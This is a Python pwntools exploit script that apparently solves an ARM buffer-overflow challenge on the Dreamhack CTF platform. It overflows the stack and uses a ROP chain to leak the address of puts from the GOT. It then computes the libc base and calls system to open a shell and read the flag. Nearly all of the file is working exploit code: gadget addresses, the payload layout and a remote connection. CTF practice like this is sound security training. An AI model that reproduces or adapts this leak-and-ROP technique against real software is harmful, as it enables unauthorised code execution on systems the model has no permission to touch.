#!/usr/bin/env python3
from pwn import *


context.arch = "arm"
context.endian = "little"

HOST = "host3.dreamhack.games"
PORT = 18818

elf = ELF("./arm_training-last")
libc_path = "/usr/arm-linux-gnueabi/lib/libc.so.6" if args.LOCAL else "./libc.so.6"
libc = ELF(libc_path)

POP_R3_PC = 0x10480
MOV_R0_R3_POP_FP_PC = 0x106e4
CALL_PUTS_AND_RESTART = 0x107bc
OFFSET = 52
KNOWN_FP = int(args.FP, 16) if args.FP else None


def start():
    if args.LOCAL:
        return process(["qemu-arm-static", "-L", "/usr/arm-linux-gnueabi", "./arm_training-last"])
    return remote(HOST, PORT)


def train(io):
    io.recvuntil(b"Are you ready?(y/n) ")
    io.send(b"yA")
    io.recvuntil(b"Press enter when you want to stop\n")
    io.recvn(24)
    io.send(b"\n")
    io.recvuntil(b"Are you ready?(y/n) ")
    io.send(b"nA")
    io.recvuntil(b"Give me all your ARM Power!!\n")


def overflow(io, chain):
    payload = flat(
        b"A" * OFFSET,
        chain,
    )
    io.send(payload)


def leak_puts(io):
    train(io)
    chain = [
        POP_R3_PC,
        elf.got["puts"],
        MOV_R0_R3_POP_FP_PC,
        KNOWN_FP or 0xDEADBEEF,
        CALL_PUTS_AND_RESTART,
    ]
    overflow(io, chain)

    data = io.recvuntil(b"Let's Train your arm!", timeout=5)
    leak = data.split(b"\n", 1)[0]
    return u32(leak[:4].ljust(4, b"\x00"))


def get_shell(io, libc_base):
    system = libc_base + libc.sym["system"]
    cmd = (KNOWN_FP + 20) if KNOWN_FP else 0

    io.recvuntil(b"Are you ready?(y/n) ")
    io.send(b"nA")
    io.recvuntil(b"Give me all your ARM Power!!\n")
    chain = [
        POP_R3_PC,
        cmd,
        MOV_R0_R3_POP_FP_PC,
        0xDEADBEEF,
        system,
        b"cat /flag\x00",
    ]
    overflow(io, chain)


def main():
    io = start()

    if args.BASE:
        libc_base = int(args.BASE, 16)
        log.info(f"libc base: {libc_base:#x}")
        train(io)
        chain = [
            POP_R3_PC,
            libc_base + next(libc.search(b"/bin/sh")),
            MOV_R0_R3_POP_FP_PC,
            0xDEADBEEF,
            libc_base + libc.sym["system"],
        ]
        overflow(io, chain)
    else:
        puts = leak_puts(io)
        libc_base = puts - libc.sym["puts"]
        log.info(f"puts leak: {puts:#x}")
        log.info(f"libc base: {libc_base:#x}")
        get_shell(io, libc_base)

    io.sendline(b"cat /flag")
    io.interactive()


if __name__ == "__main__":
    main()
